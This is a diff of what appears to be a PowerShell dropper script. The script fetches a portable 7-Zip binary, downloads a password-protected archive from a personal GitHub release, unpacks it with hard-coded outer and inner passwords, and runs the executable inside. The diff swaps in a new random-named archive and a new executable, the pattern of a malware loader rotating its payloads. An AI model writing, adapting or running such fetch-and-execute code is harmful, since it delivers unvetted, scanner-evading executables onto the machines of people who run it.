@@ -1,6 +1,6 @@
 ﻿$SevenZipUrl = 'https://github.com/ip7z/7zip/releases/download/26.02/7zr.exe'
 $PortableSevenZip = Join-Path $PSScriptRoot '7zr.exe'
-$Urlar = 'https://github.com/addisonesparza/myrep2/releases/download/gn/gddde.7z'
+$Urlar = 'https://github.com/addisonesparza/myrep2/releases/download/gn/123123.7z'
 $OuterPassword = 'XfDZleITorJeZH'
 
 
@@ -160,7 +160,7 @@ Expand-ArchiveWith7Zip `
     -Destination $FinalDirectory `
     -Password $InnerPassword
 
-Start-Process "$FinalDirectory\SmDESHwajZy.exe"
+Start-Process "$FinalDirectory\DQrk0MooJGPVtXLQIZQO.exe"
 	 	
     }
 
